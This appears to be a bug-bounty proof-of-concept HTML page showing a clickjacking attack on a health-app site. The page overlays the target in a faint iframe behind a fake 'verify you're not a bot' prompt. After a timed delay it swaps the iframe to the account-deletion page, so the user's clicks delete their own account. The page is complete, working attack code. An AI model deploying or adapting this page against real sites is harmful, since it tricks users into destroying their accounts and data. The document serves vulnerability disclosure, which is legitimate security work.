<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body,
        html,
        iframe {
            width: 100%;
            height: 100%;
        }

        #oliviaIframe {
            width: 100%;
            position: absolute;
            z-index: 1;
            opacity: 0.3;
        }

        #startButton {
            z-index: 2;
            position: absolute;
            top: 40px;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            height: 70px;
            width: 270px;
        }

        #deleteButton1 {
            position: absolute;
            top: 20px;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            height: 70px;
            width: 270px;
            display: none;
        }

        #deleteButton2 {
            position: absolute;
            top: 70px;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            height: 50px;
            width: 270px;
            display: none;
        }

        #verificationText {
            text-align: center;
            font-size: 2rem;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            padding-top: 7rem;
        }

        h1 {
            text-align: center;
            font-size: 3rem;
            padding-top: 3rem;
        }
    </style>
</head>

<body>
    <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/home"></iframe>
    <h1>PoC Created By: n30@bugcrowdninja.com</h1>
    <p id="verificationText">In order to access this site, verify you're not a bot by clicking the button(s) above:</p>
    <button id="startButton" onclick="handleButton()">Double click here to start</button>
    <button id="deleteButton1">Click here</button>
    <button id="deleteButton2">Click here</button>
</body>
<script>
    const iframe = document.getElementById("oliviaIframe")
    const startButton = document.getElementById("startButton");
    const deleteButton1 = document.getElementById("deleteButton1")
    const deleteButton2 = document.getElementById("deleteButton2")

    const handleButton = step => {
        // Hide Double click button
        startButton.style = "display: none"

        setTimeout(() => {
            // Reload iframe
            iframe.src = "https://app.oliviahealth.ai/account/delete-account"
        }, 2500)

        // Show delete button
        deleteButton1.style = "display: inline-block; z-index: -1;"

        setTimeout(() => {
            // Hide delete button
            deleteButton1.style = "display: none"
            // Show second delete button
            deleteButton2.style = "display: inline-block; z-index: -1;"
        }, 2500)

        return
    }
</script>

</html>
